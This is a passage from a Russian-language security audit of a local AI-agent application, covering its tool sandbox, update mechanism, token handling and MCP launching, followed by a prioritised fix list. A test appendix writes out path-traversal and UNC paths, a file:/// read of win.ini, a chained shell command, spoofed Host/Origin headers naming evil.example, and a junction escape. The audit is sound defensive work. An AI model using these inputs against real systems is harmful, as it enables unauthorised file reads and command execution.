8. **Лимиты размеров** — `MAX_PACKAGE_BYTES = 200 МБ` (`updater.py:27`), `MAX_MANIFEST_BYTES = 64 КБ` (`updater.py:28`), `MAX_OUT = 12000` (`tools.py:16`), `MAX_FILES/MAX_BYTES` в RAG (`rag.py:14-17`), лимит 200 находок в `_find`.
9. **Бэкап перед обновлением** и откат при неудачной подмене (`updater.py:179-199`, `272-299`).
10. **Сервер слушает только loopback** (`HOST = "[IP_ADDRESS]"`, `main.py:37`) — снаружи машины API недоступен, что существенно снижает поверхность.
11. **Секреты не отдаются наружу** — ключи не попадают ни в `/api/state`, ни в `providers.summary`; `settings.json` не содержит ключей (проверено).
12. **MCP stderr не смешивается с протоколом** (`DEVNULL`) и ответы парсятся построчно с проверкой `id` — грубых ошибок парсинга нет.

---

## 4. Чек-лист: 10 правок по приоритету

| # | Правка | Файлы | Закрывает | Оценка |
|---|---|---|---|---|
| 1 | **Единая песочница путей**: убрать `Path.home()` из `_roots`, добавить deny-list (каталог данных, каталог установки, `.ssh`, `.aws`, браузерные профили), сравнивать через `is_relative_to` | `app/tools.py:69-98` | C3, M3, M5 | 0.5 дня |
| 2 | **Пропустить `rag.add_path` через `_resolve`** + deny-list + лимит на запрос | `app/rag.py:159-166` | C5 | 1 ч |
| 3 | **`fetch_url`: только http/https, запрет приватных адресов и `file:`**, ре-валидация после редиректов | `app/tools.py:195-203` | C2, M2, L7 | 0.5 дня |
| 4 | **MCP: закрытый каталог пресетов вместо произвольной команды**, подтверждение на запуск, `env=` с минимумом, Job Object | `app/main.py:437-463`, `app/mcp.py:65-73` | C1, M1 | 1 день |
| 5 | **Подпись и хэш обновлений** (Ed25519 + SHA-256), https-only, `zip` только из `DOWNLOAD_DIR`, запрет отката версии | `app/updater.py:89-94`, `152-174`, `339-417`, `app/main.py:372-374` | C4 | 1 день |
| 6 | **Токен: убрать из HTML**, `POST /api/session` + HttpOnly/SameSite-кука, `icacls` только владелец, убрать `?token=`, `hmac.compare_digest` | `app/main.py:18-32`, `150-164`, `174-191`, `app/ui/app.js:1-9` | H2, H7, L2 | 0.5 дня |
| 7 | **XSS: экранировать кавычки, безопасные ссылки, `textContent`, CSP + XFO + XCTO** | `app/ui/app.js:58`, `183-195`, `251`, `app/main.py:166-191` | H1, M6 | 0.5 дня |
| 8 | **Проверка `Host`/`Origin`/`Sec-Fetch-Site`** на всех маршрутах | `app/main.py:150-164` | H3 | 2 ч |
| 9 | **`run_command` без shell**: argv-массив + allow-list программ + ограничение `cwd` + Job Object с лимитами | `app/tools.py:144-153` | H4 | 1 день |
| 10 | **Security-поля отдельно от `/api/settings`** (`approval_mode`, `allow_shell`, `allow_write` — только через подтверждение в UI + журнал), ключи — в DPAPI | `app/main.py:320-323`, `app/tools.py:315`, `app/keystore.py:31-59` | H5, H6 | 0.5 дня |

Дальше (после первых десяти): изоляция MCP-процессов по сети, ротация логов и ACL на `chats\`, лимит на `/api/voice/transcribe`, `apply_pending()` при старте (L3), чистка заглушек `[PERSON_NAME]` (L4), удаление `dist` из поставки (L8).

**Порядок важен:** пп. 1-3 закрывают обходы песочницы, которые не требуют ни подтверждений, ни включённых флагов — сейчас это самые дешёвые для атакующего пути. Пп. 6-7 закрывают цепочку «страница → токен → RCE».

---

## 5. Приложение: как проверялось (воспроизводимо)

```text
# 1. Токен без аутентификации
GET http://[IP_ADDRESS]:7867/                      -> 200, токен присутствует в <meta>
GET http://[IP_ADDRESS]:7867/api/state             -> 401
GET http://[IP_ADDRESS]:7867/api/state  X-Agent-Token: <token>   -> 200
GET http://[IP_ADDRESS]:7867/api/state?token=<token>             -> 200
GET .../api/state  Host: evil.example  X-Agent-Token: <token>    -> 200   (нет валидации Host)
POST .../api/approve  Origin: http://evil.example                -> обработан (нет проверки Origin)
GET .../api/version                                             -> data_dir раскрыт
GET .../ui/app.js  (без токена)                                 -> 200

# 2. Обход allow-list (in-process, только чтение)
tools._resolve(r"C:\Users\volko\..\..\Windows\win.ini")          -> BLOCK
tools._resolve(r"\\?\C:\Users\volko\..\..\Windows\win.ini")      -> BLOCK
tools._resolve(r"\\localhost\C$\Windows\win.ini")                -> BLOCK
tools._resolve(r"C:\Windows\System32\drivers\etc\hosts")         -> BLOCK
tools._resolve(r"C:\Users\volko\AppData\Local\LocalAgent\access.token") -> ALLOW
tools._resolve(r"C:\Users\volko2\secret.txt")                    -> ALLOW  (префикс без разделителя)
tools._resolve(r"F:\Models for LMstudioX\m.gguf")                -> ALLOW
tools._fetch_url({"url": "file:///C:/Windows/win.ini"})          -> содержимое win.ini

# 3. Шелл и junction
tools._run_command({"command": "echo ONE & echo TWO"})           -> выполнились обе команды
mklink /J <temp>\win C:\Windows ; read (link/"win.ini")          -> содержимое C:\Windows\win.ini

# 4. Права
icacls %LOCALAPPDATA%\LocalAgent\access.token                     -> (I)(F) SYSTEM, Administrators, volko
icacls %LOCALAPPDATA%\LocalAgent\settings.json                   -> то же, собственных ACE нет

# 5. RAG
GET /api/rag/search?q=token&limit=2  X-Agent-Token: <token>       -> фрагменты app/main.py из индекса
```

Проверки с изменением состояния (`/api/settings`, `/api/mcp/add`, `/api/update/apply`, `/api/rag/add`) **не выполнялись**: выводы по ним сделаны по коду, чтобы не менять настройки и не запускать процессы. Junction для теста M5 создавался в `%TEMP%` и удалён; пробные файлы — только в `%TEMP%`.
